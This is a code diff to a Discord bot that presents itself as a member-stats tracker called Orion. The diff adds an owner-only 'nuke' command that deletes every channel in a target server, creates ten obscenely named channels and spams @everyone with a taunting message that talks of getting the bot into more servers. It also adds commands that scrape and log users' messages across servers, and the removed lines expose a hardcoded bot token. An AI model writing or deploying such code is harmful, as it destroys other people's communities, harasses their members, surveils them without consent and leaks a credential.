@@ -1,44 +1,442 @@
 import discord
 from discord.ext import tasks, commands
-import asyncio
+import os
+import re
+from dotenv import load_dotenv
+from discord.utils import format_dt
+from mod import Moderation
 
+load_dotenv()
 
-BOT_TOKEN = 'MTQzNjE4MzYwMjUyOTMwNDcxNw.G46iO2.-BqllSUiBaz34As_FE5HV3q1nEpZm1iSp0T8EY'
-DASHBOARD_CHANNEL_ID = 1436189217544998982 
+BOT_TOKEN = os.getenv('BOT_TOKEN')
+DASHBOARD_CHANNEL_ID = int(os.getenv('DASHBOARD_CHANNEL_ID', '0'))
+# Updated to support multiple feed channels as a comma-separated list
+FEED_CHANNEL_IDS = [
+    int(id.strip()) for id in os.getenv('FEED_CHANNEL_ID', '').split(',')
+    if id.strip().isdigit()
+]
+OWNER_ID = int(os.getenv('OWNER_ID', '0'))
+
+KEYWORDS = [
+    'OrionReconTest', 'toucan cult', 'toucanist state', 'toucan', 'toucanism',
+    'toucanist', 'toucan cultist', 'toucan cultists', 'toucan cultism',
+    'toucan cultist state', 'toucan cultist states', 'toucanist order state',
+    'toucanist order states', 'toucanist order', 'toucanist orders', 'profit',
+    'prof1t', 'sanji', 'blubber', 'menasaur', 'msr', 'k1', 'ucp', 'eb', 'e.b',
+    'wiz', 'wiz123', 'micnas', 'soviet', 'atf', 'teri', 'teribehenkapati',
+    'TS', 'T.S', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.',
+    'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'e16', 'moon', 'gagnito', 'flxx',
+    'srak', 'srak2009', 'atomic', 'atomiccyber', 'atomic_cyber', '67', 'rape',
+    'cp'
+]
 
 intents = discord.Intents.default()
 intents.guilds = True
-intents.members = True  # Required to get member counts
+intents.members = True
 intents.presences = False
+intents.message_content = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='$', intents=intents)
+
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name}')
+    print(f'✅ Logged in as {bot.user.name} (ID: {bot.user.id})')
+    print(f'📊 Monitoring {len(bot.guilds)} server(s)')
+    print(f'📢 Feed channels configured: {len(FEED_CHANNEL_IDS)}')
     send_stats.start()
+
+
+@bot.event
+async def on_connect():
+    await bot.add_cog(Moderation(bot))
+
+
+@bot.command()
+async def resync(ctx):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("❌ You are not authorized to use this command.")
+        return
+
+    await ctx.send("re-syncing commands...")
+    try:
+        bot.tree.clear_commands(guild=None)
+        for guild in bot.guilds:
+            bot.tree.clear_commands(guild=guild)
+        await bot.tree.sync()
+        await ctx.send("✅ Commands cleared and re-synced.")
+        print("✅ Commands cleared and re-synced globally.")
+    except Exception as e:
+        await ctx.send(f"❌ Error clearing/syncing commands: {e}")
+        print(f"❌ Error clearing/syncing commands: {e}")
+
 
 @tasks.loop(minutes=10)
 async def send_stats():
     channel = bot.get_channel(DASHBOARD_CHANNEL_ID)
     if not channel:
-        print("Dashboard channel not found.")
+        print(f"❌ Dashboard channel not found (ID: {DASHBOARD_CHANNEL_ID})")
         return
 
-    message = "**📊 Server Stats Update**\n\n"
+    embed = discord.Embed(title="⃝␥ Orion StatTracker",
+                          description="📊 Server Stats Update",
+                          color=discord.Color.gold(),
+                          timestamp=discord.utils.utcnow())
+    embed.set_footer(text="🔍 Orion Reconnaissance",
+                     icon_url=bot.user.avatar.url if bot.user.avatar else None)
+    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
+
     for guild in bot.guilds:
         member_count = guild.member_count
-        message += f"🌐 **{guild.name}**\n👥 Members: {member_count}\n\n"
+        embed.add_field(name=f"🌐 {guild.name}",
+                        value=f"👥 Members: {member_count}",
+                        inline=False)
 
-    await channel.send(message)
+    try:
+        await channel.send(embed=embed)
+        print(f"✅ Stats update sent to #{channel.name}")
+    except Exception as e:
+        print(f"❌ Error sending stats: {e}")
 
-# Optional command to trigger stats manually
+
+@send_stats.before_loop
+async def before_send_stats():
+    await bot.wait_until_ready()
+
+
 @bot.command()
 async def stats(ctx):
-    message = "**📊 Server Stats Update**\n\n"
+    embed = discord.Embed(title="⃝␥ Orion StatTracker",
+                          description="📊 Server Stats Update",
+                          color=discord.Color.gold(),
+                          timestamp=discord.utils.utcnow())
+    embed.set_footer(text="🔍 Orion Reconnaissance",
+                     icon_url=bot.user.avatar.url if bot.user.avatar else None)
+    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
+
     for guild in bot.guilds:
         member_count = guild.member_count
-        message += f"🌐 **{guild.name}**\n👥 Members: {member_count}\n\n"
-    await ctx.send(message)
+        embed.add_field(name=f"🌐 {guild.name}",
+                        value=f"👥 Members: {member_count}",
+                        inline=False)
 
-bot.run(MTQzNjE4MzYwMjUyOTMwNDcxNw.G46iO2.-BqllSUiBaz34As_FE5HV3q1nEpZm1iSp0T8EY)
+    await ctx.send(embed=embed)
+
+
+@bot.command()
+async def sync(ctx):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("❌ You are not authorized to use this command.")
+        return
+
+    await ctx.send("🔄 Syncing slash commands globally...")
+    print("🔄 Starting global sync of slash commands...")
+    try:
+        await bot.tree.sync()
+        await ctx.send(
+            "✅ Slash commands synced successfully. It may take up to an hour for global commands to update."
+        )
+        print("✅ Global slash commands sync completed.")
+    except Exception as e:
+        await ctx.send(f"❌ Error syncing commands: {e}")
+        print(f"❌ Error syncing slash commands: {e}")
+
+
+@bot.command()
+async def clear_sync(ctx):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("❌ You are not authorized to use this command.")
+        return
+
+    await ctx.send("🗑️ Clearing all slash commands and re-syncing...")
+    print("🗑️ Clearing all slash commands...")
+    try:
+        bot.tree.clear_commands(guild=None)
+        for guild in bot.guilds:
+            bot.tree.clear_commands(guild=guild)
+        await bot.tree.sync()
+        await ctx.send(
+            "✅ Commands cleared and re-synced globally. It may take up to an hour for changes to propagate."
+        )
+        print("✅ Commands cleared and re-synced globally.")
+    except Exception as e:
+        await ctx.send(f"❌ Error clearing/syncing commands: {e}")
+        print(f"❌ Error clearing/syncing commands: {e}")
+
+
+@bot.command()
+async def nuke(ctx, server_id: str):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("❌ You are not authorized to use this command.")
+        return
+
+    try:
+        target_guild = bot.get_guild(int(server_id))
+    except ValueError:
+        await ctx.send("❌ Invalid server ID.")
+        return
+
+    if not target_guild:
+        await ctx.send(
+            "❌ Bot is not in the specified server or server not found.")
+        return
+
+    if not target_guild.me.guild_permissions.manage_channels:
+        await ctx.send(
+            "❌ The bot does not have permission to manage channels in the specified server."
+        )
+        return
+
+    await ctx.send("🔄 Nuking the server...")
+
+    for channel in target_guild.channels:
+        try:
+            await channel.delete()
+            print(f"✅ Deleted channel: {channel.name} in {target_guild.name}")
+        except Exception as e:
+            print(
+                f"❌ Error deleting channel {channel.name} in {target_guild.name}: {e}"
+            )
+
+    # Create 10 "crack-femboys" channels
+    created_channels = []
+    for i in range(1, 11):  # 1 to 10
+        try:
+            new_channel = await target_guild.create_text_channel(
+                f"crack-femboys{i}")
+            created_channels.append(new_channel)
+            print(
+                f"✅ Created channel: {new_channel.name} in {target_guild.name}"
+            )
+        except Exception as e:
+            print(
+                f"❌ Error creating channel crack-femboys{i} in {target_guild.name}: {e}"
+            )
+
+    # Send the message to each created channel
+    message_content = """||@everyone||
+# Hey guys @✠ 𝑷𝒓𝒐𝒇𝒊𝒕 is your lord and savior now 😁😅
+**Bot FAQ**
+Will you nuke [insert server name] for me?
+-Not right now, working on better ways to get the bot into servers
+Why did you nuke this server?
+-Your owner sends NSFW to minors
+Is your bot open-source?
+-Not yet
+https://media.discordapp.net/attachments/1435662415965585520/1436378790287904850/Black_Sun_glich.gif?ex=690f637e&is=690e11fe&hm=36c8ec2759ab88fe96dd52ba5eb87ad75f707d4a2b4cae841b489f59ec418a59&=&width=619&height=349"""
+    for channel in created_channels:
+        try:
+            await channel.send(message_content)
+            print(
+                f"✅ Sent crack message in #{channel.name} in {target_guild.name}"
+            )
+        except Exception as e:
+            print(
+                f"❌ Error sending crack message in #{channel.name} in {target_guild.name}: {e}"
+            )
+
+    await ctx.send("Femboys have been cracked.")
+
+
+@bot.tree.command(name="sync",
+                  description="Manually sync slash commands (Owner only)")
+async def sync_commands(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message(
+            "❌ You are not authorized to use this command.", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    try:
+        for guild in bot.guilds:
+            await bot.tree.sync(guild=guild)
+        await interaction.followup.send(
+            "✅ Slash commands synced successfully.", ephemeral=True)
+        print("✅ Manual slash commands sync completed.")
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error syncing commands: {e}",
+                                        ephemeral=True)
+        print(f"❌ Error syncing slash commands: {e}")
+
+
+@bot.command()
+async def fetch(ctx, keyword: str, num_messages: int, server_id: str = None):
+    if server_id:
+        try:
+            target_guild = bot.get_guild(int(server_id))
+        except ValueError:
+            await ctx.send("❌ Invalid server ID.")
+            return
+
+        if not target_guild:
+            await ctx.send(
+                "❌ Bot is not in the specified server or server not found.")
+            return
+    else:
+        target_guild = ctx.guild
+
+    if num_messages > 100:
+        await ctx.send("❌ Maximum number of messages to fetch is 100.")
+        return
+
+    if not target_guild.me.guild_permissions.read_message_history:
+        await ctx.send(
+            "❌ The bot does not have permission to read message history in the specified server."
+        )
+        return
+
+    await ctx.send("🔍 Fetching messages...")
+
+    matching_messages = []
+    keyword_lower = keyword.lower()
+
+    for channel in target_guild.text_channels:
+        if len(matching_messages) >= num_messages:
+            break
+        try:
+            async for message in channel.history(limit=500):
+                if keyword_lower in message.content.lower():
+                    matching_messages.append(message)
+                    if len(matching_messages) >= num_messages:
+                        break
+        except Exception as e:
+            print(f"❌ Error fetching messages from {channel.name}: {e}")
+            continue
+
+    if not matching_messages:
+        await ctx.send("No messages found containing that keyword.")
+        return
+
+    server_info = f" from server: {target_guild.name} (ID: {target_guild.id})" if server_id else " from this server"
+    content = f"Fetched messages for keyword: '{keyword}'{server_info}\n\n"
+    for msg in matching_messages:
+        content += f"Author: {msg.author} (ID: {msg.author.id})\n"
+        content += f"Channel: #{msg.channel.name}\n"
+        content += f"Timestamp: {msg.created_at}\n"
+        content += f"Content: {msg.content}\n"
+        content += "-" * 50 + "\n\n"
+
+    file_path = "fetched_messages.txt"
+    with open(file_path, "w", encoding="utf-8") as f:
+        f.write(content)
+
+    try:
+        await ctx.send(file=discord.File(file_path))
+        print(
+            f"✅ Fetched {len(matching_messages)} messages for keyword '{keyword}'{server_info} and sent as TXT file."
+        )
+    except Exception as e:
+        print(f"❌ Error sending file: {e}")
+        await ctx.send("❌ Error sending the file.")
+
+    os.remove(file_path)
+
+
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+
+    message_content_lower = message.content.lower()
+    detected_keyword = None
+    highlighted_message = message.content
+    for keyword in KEYWORDS:
+        pattern = r'\b' + re.escape(keyword.lower()) + r'\b'
+        if re.search(pattern, message_content_lower):
+            detected_keyword = keyword
+            highlighted_message = re.sub(pattern,
+                                         lambda m: f"**{m.group()}**",
+                                         message.content,
+                                         flags=re.IGNORECASE)
+            break
+
+    if detected_keyword:
+        # Loop through all feed channels and send the embed to each
+        for feed_channel_id in FEED_CHANNEL_IDS:
+            feed_channel = bot.get_channel(feed_channel_id)
+            if not feed_channel:
+                print(f"❌ Feed channel not found (ID: {feed_channel_id})")
+                continue
+
+            embed_color = discord.Color.dark_red()
+
+            embed = discord.Embed(title="⃝␥ Orion Reconnaissance Platform",
+                                  description=highlighted_message[:4096],
+                                  color=embed_color,
+                                  timestamp=message.created_at)
+
+            embed.set_author(
+                name=f"{message.author.name}#{message.author.discriminator}",
+                icon_url=message.author.display_avatar.url
+                if message.author.display_avatar else None)
+
+            embed.set_thumbnail(url=message.guild.icon.url if message.guild
+                                and message.guild.icon else None)
+
+            embed.add_field(name="Channel",
+                            value=f"<#{message.channel.id}>",
+                            inline=True)
+            embed.add_field(
+                name="Server",
+                value=message.guild.name if message.guild else "DM",
+                inline=True)
+            embed.add_field(name="Matched Keyword",
+                            value=f"`{detected_keyword}`",
+                            inline=True)
+
+            embed.set_footer(text=format_dt(message.created_at, "R"))
+
+            try:
+                await feed_channel.send(embed=embed)
+                print(
+                    f"✅ Keyword alert sent to #{feed_channel.name} (ID: {feed_channel_id}) for message by {message.author} (keyword: {detected_keyword})"
+                )
+            except Exception as e:
+                print(
+                    f"❌ Error sending keyword alert to #{feed_channel.name} (ID: {feed_channel_id}): {e}"
+                )
+
+    await bot.process_commands(message)
+
+
+if __name__ == "__main__":
+    if not BOT_TOKEN:
+        print("❌ Error: BOT_TOKEN not found in environment variables")
+        print(
+            "Create a .env file and add your bot token, BOT_TOKEN=your_token_here"
+        )
+        exit(1)
+
+    if DASHBOARD_CHANNEL_ID == 0:
+        print("⚠️  Warning: DASHBOARD_CHANNEL_ID not set")
+
+    if not FEED_CHANNEL_IDS:
+        print(
+            "⚠️  Warning: FEED_CHANNEL_ID not set or invalid (keyword monitoring will not work)"
+        )
+
+    if OWNER_ID == 0:
+        print(
+            "⚠️  Warning: OWNER_ID not set (nuke, sync, and clear_sync commands will not work)"
+        )
+
+    print("Launching Orion Reconnaissance Platform...")
+    print("=" * 50)
+
+    try:
+        bot.run(BOT_TOKEN)
+    except discord.errors.PrivilegedIntentsRequired:
+        print("\n" + "=" * 50)
+        print("❌ PRIVILEGED INTENTS ERROR")
+        print("=" * 50)
+        print("The bot requires Server Members Intent to count members.")
+        print("To fix this:")
+        print("1. Go to https://discord.com/developers/applications")
+        print("2. Select your bot application")
+        print("3. Go to the 'Bot' tab")
+        print("4. Scroll to 'Privileged Gateway Intents'")
+        print("5. Enable 'SERVER MEMBERS INTENT'")
+        print("6. Save changes and restart the bot")
+        print("=" * 50)
+    except Exception as e:
+        print(f"\n❌ Error running bot: {e}")
